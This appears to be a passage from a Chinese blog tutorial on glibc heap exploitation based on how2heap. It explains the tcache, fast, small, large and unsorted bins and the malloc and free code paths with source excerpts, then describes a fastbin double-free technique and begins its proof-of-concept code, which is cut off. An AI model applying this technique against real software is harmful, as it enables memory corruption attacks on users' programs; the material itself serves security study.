<h3 id="空闲-chunk-容器——bins"><a href="#空闲-chunk-容器——bins" class="headerlink" title="空闲 chunk 容器——bins"></a>空闲 chunk 容器——bins</h3><p>chunk 被释放后，会被放入 bins 中，当再次分配的时候会先从 bins 中搜索，最大限度地提高分配和释放的速度。<br>有 5 种类型的 bin：每个线程62 个 small bin、63 个large bin、1 个unsorted bin、10 个fast bin和 64 个tcache bin 。small、large 和 unsorted bins 是最初就有的 bin 类型，由bins[NBINS <em> 2 - 2]管理保存。用于实现堆的基本回收策略。fast bins 和 tcache bins 是在它们之上的优化。<br>bins[NBINS </em> 2 - 2]是存储所有unsorted bin、large bin、small bin的链表表头的数组。<br>Bin 1 – Unsorted bin<br>Bin 2 to Bin 63 – Small bin<br>Bin 64 to Bin 126 – Large bin<br>引用大佬的一张图：<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/bin分布.png" alt><br>NBINS的值为128，而1+62+63=126个Bin。这里该怎么理解呢？事实上，bin[0]和 bin[127]<br>都不存在，bin[1]为 unsorted bin 的 chunk 链表头。首先bins[]是一个 mchunkptr 类型的数组，里面存储了<code>NBINS * 2 - 2 = 254</code>个 mchunkptr 指针。一般情况下，一个 malloc_chunk是6个 mchunkptr 指针大小（包括prev_size、size、fd、bk、fd_nextsize、bk_nextsize），但是在 bin 头结点中，prev_size、size、fd_nextsize、bk_nextsize都是用不上的，只有fd和bk指针会用到，这就涉及到一个重要的问题——空间复用。上面那张图详细展示了空间复用是什么意思。我们将254个 mchunkptr 标记为 bin[0]到bin[253]，两个 mchunkptr 标记为一个Bin。事实上，第一个 unsorted bin链表的头结点的prev_size和size两个指针使用bin[0]和bin[1]，它的fd和bk指针才能占用 bin[2] 和 bin[3]，这样 bin_at(chunk) 的返回值就是bin[2]和bin[3]组成的Bin[1]。然后 small bin 第一个链表的头结点的 prev_size和size两个指针占用bin[2]和bin[3]，fd 和 bk 指针占用bin[4]和bin[5]，bin_at得到的就是bin[4]和bin[5]组成的Bin[2]。<br>fast bin和 tcache bin不归 Bin 数组来管理。</p>
<ol>
<li>fast bins<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/mind_fastbin.png" alt><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_FAST_SIZE     (80 * SIZE_SZ / 4)</span></span><br><span class="line">pwndbg&gt; p SIZE_SZ</span><br><span class="line">$<span class="number">4</span> = <span class="number">8</span></span><br><span class="line">DEFAULT_MXFAST <span class="number">64</span> (<span class="keyword">for</span> <span class="number">32b</span>it), <span class="number">128</span> (<span class="keyword">for</span> <span class="number">64b</span>it)</span><br><span class="line">#define set_max_fast(s) \</span><br><span class="line">  global_max_fast = (((s) == <span class="number">0</span>)						      \</span><br><span class="line">                     ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="line">#define get_max_fast() global_max_fast</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>fast bin 的结构如上图所示。fast bin 是单向链表，所以只有 fd 指针用到。进入fast bin 的 chunk 的prev_inuse位设为1，所以不会与前后空闲的 chunk 合并。fast bin 采用先进后出原则，每个 fast bin 只存储相同大小的 chunk，最多有10个，范围为 0x20 到 0xb0。在初始化堆的时候默认设置 global_max_fast 为 DEFAULT_MXFAST，也就是128 byte，即只用0x20到0x80这几个，大于0x80的就进入了 unsorted bin。调用 mallopt 设置 fastbin 的最大值，后面的0x90到0xb0还可以继续使用。当 free 的 chunk 大小小于 global_max_fast 的时候，会首先被放进 fast bin。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/patchfastmax.png" alt><br><img src="/2022/04/18/how2heap深入浅出学习堆利用/fastbin0x90.png" alt></p>
<ol>
<li>tcache bin<br>在 glibc 2.26 后引入了 tcache bin，它的出现优化了线程锁竞争的问题。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_MAX_BINS 64</span></span><br><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> key;</span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence "tcache_perthread_struct").  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p><code>TCACHE_MAX_BINS</code>值定义为64，默认情况下，每个线程有 64 个 tcache bin 单链表，采用头插法先进后出原则。每个 bin 链最多包含7 个相同大小的块。与 fastbin 一样，tcache bin 上的 chunk 的 prev_inuse 位设为1，不会与相邻的空闲 chunk 合并。<br>当一个chunk被释放时，首先进入 per thread cache（tcache）而不是fast bin，这样当该线程再次申请分配的时候，如果在其线程 tcache bin 上有空闲 chunk，就从 tcache bin 中取出，无需等待堆锁，实现了加速分配。填满了这个大小的 tcache bin 后，再释放的 chunk 才会进入 fast bin。<br>tcache bin 相关数据结构：<br>tcache bin由 tcache_entry 和 tcache_perthread_struct 两个结构体来管理。<br>tcache_entry 结构体有两个成员，一个是next指针，用来存放指向 bin 中下一个 chunk 的地址（并不是直接存储，而是会进行移位异或后存储。tcache_put函数会看到）；一个是key，放在了chunk 的 bk 指针位置（因为tcache bin是单链表，没有用到 bk 指针），用来标记“chunk已经在 tcache 中”，避免了double free。<br>tcache_perthread_struct 结构体用来管理 tcache bins，在每个线程中都有一个。<br>counts[TCACHE_MAX_BINS]是一个字节数组，用来记录各个大小的tcahce bin中chunk的数量，最大为7，因为一个 tcache bin 中最多存储7个 chunk。<br><code>*entries[TCACHE_MAX_BINS]</code>是一个指针数组，也有TCACHE_MAX_BINS个元素，用来记录各个大小的tcache bin，存储的内容为对应 tcache_entry 结构体地址。64位注意16字节对齐。<br>简单画个示意图：<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/tcache_bin_chunk.png" alt><br>也就是说，一个tcache bin chunk至少0x20字节。</p>
<ol>
<li>small bin<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NSMALLBINS         64</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> in_smallbin_range(sz)  \</span></span><br><span class="line">  ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) MIN_LARGE_SIZE)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> smallbin_index(sz) \</span></span><br><span class="line">  ((SMALLBIN_WIDTH == <span class="number">16</span> ? (((<span class="keyword">unsigned</span>) (sz)) &gt;&gt; <span class="number">4</span>) : (((<span class="keyword">unsigned</span>) (sz)) &gt;&gt; <span class="number">3</span>))\</span><br><span class="line">   + SMALLBIN_CORRECTION)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>small bin 为双向链表，共有62个（这里写64感觉是方便计算），每个 small bin 链存储相同大小的 chunk。两个相邻的small bin中的chunk大小相差8bytes。采用先进先出原则，使用头插法在链表头插入最后释放的 chunk。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/s&amp;l&amp;ubin.png" alt><br>这张图的 bin 链结构适用于small bin、large bin 和unsorted bin三个。</p>
<ol>
<li>large bin<br>small bins 的策略非常适合小分配，但堆管理器不能为每个大小的 chunk 都准备一个 bin。对于超过 512 字节（32位）或1024 字节（64位）的 chunk，堆管理器使用 large bin。large bin比起其他的 bin 多了 fd_nextsize 和 bk_nextsize 结构体指针和他们组成的双向链表，用来加速查找 chunk size。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/largebin_nextsize.png" alt><br>large bin 为双向链表，共63个，存储一定范围的 chunk，插入large bin的时候，从头部遍历，unlink 的时候，从 nextsize 链表尾部遍历。fd_nextsize是指向 size 变小的方向，相同大小的 chunk 同样按照最近使用顺序排列。同时，更改 fd_nextsize 和 bk_nextsize 指针内容。<br>具体的在 large bin attack 部分调试。</li>
<li>unsorted bin<br>unsorted bin 是双向链表，采用先进先出。释放 chunk 时，不会先将其放入 small bin 或者 large bin，而是先检查物理相邻的前后 chunk 是否空闲，空闲则可以进行合并，合并后使用头插法将其放入 unsorted bin。在 malloc 申请的时候反向遍历 unsorted bin，如果不是恰好合适的大小，就将其放入对应的 small bin 或者 large bin，恰好合适的大小就可以拿来用了。<h3 id="malloc过程"><a href="#malloc过程" class="headerlink" title="malloc过程"></a>malloc过程</h3></li>
<li>计算申请的大小，如果对应大小的 tcache bin 有空闲 chunk，则立即返回。没有转向2</li>
<li><p>如果小于 fast bin 的最大大小，则遍历 fast bin 查找。同时如果 fast bin 对应的 tcache bin 有空位，则把 fast bin 中的 chunk 链入 tcache bin。（调试见fast bin reverse into tcache）。这一步失败转向3</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">&#123;</span><br><span class="line">	idx = fastbin_index (nb);</span><br><span class="line">	mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">	...</span><br><span class="line">	 <span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">		 stash them in the tcache.  */</span></span><br><span class="line">	<span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	<span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	&#123;</span><br><span class="line">		mchunkptr tc_victim;</span><br><span class="line">		<span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">		<span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)&#123;...&#125;</span><br><span class="line">		...</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果是一个small bin 大小的请求，则搜索 small bin 。同时如果对应的 tcache bin 有空位，则把 chunk 链入 tcache bin。这一步没有实现则跳转到5。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">&#123;</span><br><span class="line">	idx = smallbin_index (nb);</span><br><span class="line">	bin = bin_at (av, idx);</span><br><span class="line">	...</span><br><span class="line">	<span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">	     stash them in the tcache.  */</span></span><br><span class="line">	<span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	<span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	&#123;</span><br><span class="line">		mchunkptr tc_victim;</span><br><span class="line">		<span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">	    <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count&amp;&amp; (tc_victim = last (bin)) != bin)&#123;...&#125;</span><br><span class="line">		...</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果是一个 large bin 大小的请求，则首先合并 fast bin 中的 chunk 并使用头插法插入 unsorted bin。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	idx = largebin_index (nb);</span><br><span class="line">	<span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">		malloc_consolidate (av);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>反向遍历 unsorted bin。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))&#123;...&#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>最初检查了一下，如果分配的是 small bin chunk，并且 unsorted bin 中只有一个 chunk，并且这个 chunk 为 last remainder chunk，并且这个 chunk 的大小大于所需 chunk 的大小加上 MINSIZE，切割 last remainder，切割剩余的 chunk 依然作为 last remainer，如果大小属于large bin设置 fd_nextsize 和 bk_nextsize 指针为 null。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;bck == unsorted_chunks (av) &amp;&amp; victim == av-&gt;last_remainder &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* split and reattach remainder */</span></span><br><span class="line">	remainder_size = size - nb;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>否则遍历过程中，如果不是恰好合适的大小，就将遍历过的 chunk 放入对应的 small bin 或者 large bin（这是唯一将 chunk 放入 small bin 或者 large bin 的过程）。放入large bin 的过程比较麻烦，要避免修改 nextsize 链，所以插入在相同大小的 chunk 之后，调试的时候会遇到。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">&#123;</span><br><span class="line">	victim_index = smallbin_index (size);</span><br><span class="line">	bck = bin_at (av, victim_index);</span><br><span class="line">	fwd = bck-&gt;fd;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	victim_index = largebin_index (size);</span><br><span class="line">	bck = bin_at (av, victim_index);</span><br><span class="line">	fwd = bck-&gt;fd;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>遍历清空完 unsorted bin后，如果分配 large bin chunk，遍历 large bin 链。如果链表为空或者链表中最大的 chunk（也就是链表中的第一个 chunk）也不能满足要求，则不能从 large bin 中分配。否则遍历链表找到大于等于的 chunk，找到后退出循环。（具体在调试 unlink attack ）可能会需要切割找到的 chunk，切割后形成 remainer 链入 unsorted bin，触发 unlink（会有unlink attack）。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">&#123;</span><br><span class="line">	bin = bin_at (av, idx);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line">++idx;</span><br><span class="line">bin = bin_at (av, idx);</span><br><span class="line">block = idx2block (idx);</span><br><span class="line"><span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">bit = idx2bit (idx);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">	...</span><br><span class="line">	victim = last(bin);</span><br><span class="line">	...</span><br><span class="line">	assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb));</span><br><span class="line">	remainder_size = size - nb;</span><br><span class="line">	...</span><br><span class="line">	unlink_chunk (av, victim);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<ol>
<li><p>bins 中没有可用 chunk，尝试从 top chunk 上切割一块出来。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use_top:</span><br><span class="line">    victim = av-&gt;top;</span><br><span class="line">    size = chunksize (victim);</span><br><span class="line">	...</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果 top chunk 不够大，先调用 consolidate 合并 fastbin 中的 chunk，再使用 sbrk 函数扩展 top chunk。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">&#123;</span><br><span class="line">	malloc_consolidate (av);</span><br><span class="line">	<span class="comment">/* restore original bin index */</span></span><br><span class="line">	<span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">		idx = smallbin_index (nb);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		idx = largebin_index (nb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果 size 更大，brk 指针扩展到头（在高地址遇到了使用中的内存使heap无法连续）也满足不了，则使用 mmap 函数在 mmap 映射段申请内存。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">	<span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">		alloc_perturb (p, bytes);</span><br><span class="line">	<span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="free过程"><a href="#free过程" class="headerlink" title="free过程"></a>free过程</h3><p>heap 上的 chunk 释放后放入对应 arena 的 bin 链表中，mmap 函数创建的 mmap chunk 则调用 munmap 直接归还系统（设置了 M 位）。</p>
<ol>
<li>如果 tcache 中有空间，放入对应的 tcache bin。</li>
<li><p>如果是 mmap 函数创建的 chunk 调用 munmap 直接归还系统（设置了 M 位）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//If the chunk was allocated via mmap, release via munmap().</span></span><br><span class="line"><span class="keyword">else</span> &#123;munmap_chunk (p);&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>获得 arena heap lock（arena锁）。tcache bin 满了就放进对应的 fast bin。</p>
</li>
<li><p>不是 fastbin 范围内的 chunk 放入 unsorted bin。放进去的时候检查物理相邻的前后 chunk，如果是空闲的则合并后再放进去。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) </span><br><span class="line">&#123;</span><br><span class="line">	prevsize = prev_size (p);</span><br><span class="line">	size += prevsize;</span><br><span class="line">	p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">	...</span><br><span class="line">	unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="comment">/* consolidate forward */</span></span><br><span class="line">	<span class="keyword">if</span> (!nextinuse) </span><br><span class="line">	&#123;</span><br><span class="line">		unlink_chunk (av, nextchunk);</span><br><span class="line">		size += nextsize;</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">	bck = unsorted_chunks(av);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果 chunk 与 top chunk 物理相邻，则将其合并到 top chunk 而不是存入 bin。这里是在向后合并了低地址的 chunk 后再检查向前合并高地址，也就是合并了低地址的 chunk 后再一起并入 top chunk。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//If the chunk borders the current high end of memory,consolidate into top</span></span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">	size += nextsize;</span><br><span class="line">	set_head(p, size | PREV_INUSE);</span><br><span class="line">	av-&gt;top = p;</span><br><span class="line">	check_chunk(av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果 chunk 足够大（FASTBIN_CONSOLIDATION_THRESHOLD），合并所有 fastbin 并检查 top chunk （这里可能会减小 brk 指针）。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) </span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">		malloc_consolidate(av);</span><br><span class="line">	<span class="keyword">if</span> (av == &amp;main_arena) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(chunksize(av-&gt;top)) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.trim_threshold))</span><br><span class="line">			systrim(mp_.top_pad, av);</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">/* Always try heap_trim(), even if the top chunk is not	large, because the corresponding heap might go away.  */</span></span><br><span class="line">		heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line">		assert(heap-&gt;ar_ptr == av);</span><br><span class="line">		heap_trim(heap, mp_.top_pad);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="fastbin-dup-glibc2-34"><a href="#fastbin-dup-glibc2-34" class="headerlink" title="fastbin_dup_glibc2.34"></a>fastbin_dup_glibc2.34</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>实现double_free。<br>fast bins为单链表存储。fast bins的存储采用后进先出（LIFO）的原则：后free的chunk会被添加到先free的chunk的后面；同理，通过malloc取出chunk时是先去取最新放进去的。free的时候如果是fast bin，就会检查链表顶是不是要释放的chunk_ptr。所以只要链表顶不是该chunk，就可以继续free，从而实现double free。</p>
<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>how2heap源码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span 